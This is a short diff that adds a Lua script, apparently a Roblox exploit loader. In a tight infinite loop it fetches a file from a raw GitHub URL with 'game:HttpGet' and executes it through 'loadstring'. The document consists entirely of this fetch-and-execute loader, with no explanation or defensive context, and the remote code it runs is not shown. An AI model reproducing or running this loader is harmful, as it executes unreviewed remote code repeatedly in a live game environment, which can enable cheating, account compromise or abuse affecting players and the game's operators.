@@ -1,0 +1,3 @@
+while wait(0.00001) do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DOWNINOHIOSWAG/Sha/refs/heads/main/The"))()
+end
